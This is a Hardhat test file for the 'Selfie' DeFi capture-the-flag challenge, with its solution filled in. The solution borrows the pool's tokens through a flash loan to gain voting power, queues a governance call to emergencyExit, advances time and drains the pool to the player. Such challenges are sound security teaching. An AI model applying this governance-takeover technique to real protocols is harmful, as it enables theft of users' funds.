const { ethers } = require("hardhat");
const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Selfie", function () {
  let deployer, player;
  let token, governance, pool;

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory("DamnValuableTokenSnapshot", deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory("SimpleGovernance", deployer)
    ).deploy(token.address);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory("SelfiePool", deployer)
    ).deploy(token.address, governance.address);
    expect(await pool.token()).to.eq(token.address);
    expect(await pool.governance()).to.eq(governance.address);

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token.address, 0)).to.eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // STEPS:
    //  1. Borrow all the tokens from the pool with a free flashLoan
    //  2. During the flash loan:
    //    - Make a snapshot of the token holders
    //    - Call queueAction() on SimpleGovernance targeting emergencyExit() in the SelfiePool
    //    - Return the tokens to the pool
    //  5. Wait 2 days
    //  6. Call executeAction() and send all the tokens to yourself

    const attackContract = await (
      await ethers.getContractFactory("AttackSelfie", player)
    ).deploy(governance.address, pool.address, token.address);

    // Create function data
    let ABI = ["function emergencyExit(address receiver)"];
    let iface = new ethers.utils.Interface(ABI);
    let functionData = iface.encodeFunctionData("emergencyExit", [
      player.address,
    ]);

    await attackContract.attack(functionData);
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await attackContract.executeAction();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
